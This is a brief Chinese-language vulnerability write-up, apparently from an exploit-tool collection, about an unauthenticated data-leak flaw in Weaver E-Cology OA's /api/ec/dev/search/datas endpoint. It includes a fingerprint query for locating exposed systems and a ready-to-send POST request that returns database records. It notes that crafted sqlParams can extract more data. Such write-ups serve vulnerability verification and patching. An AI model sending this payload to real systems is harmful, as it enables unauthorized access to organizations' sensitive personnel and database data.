---
source: "LittleBear4/OA-EXPTOOL"
---

# 泛微E-Cology datas接口敏感信息泄漏漏洞

## 漏洞描述

泛微 E-Cology 的 `/api/ec/dev/search/datas` 接口存在未授权访问漏洞。该接口接受 POST 请求并执行 `sqlParams` 中的 SQL 查询，攻击者无需登录即可通过该接口查询数据库中的敏感信息。

## 漏洞影响

```
泛微 E-Cology
```

## 网络测绘

```
app="泛微-协同办公OA"
```

## 漏洞复现

```http
POST /api/ec/dev/search/datas HTTP/1.1
Content-Type: application/json

{"sqlParams":{"__x0020__":11},"tableName":"aaa","pageNo":1,"condition":1}
```

若响应状态码为 200 且返回包含 `HrmResource` 等字段的数据库查询结果，则漏洞存在。攻击者可通过构造 `sqlParams` 进一步读取更多敏感数据。
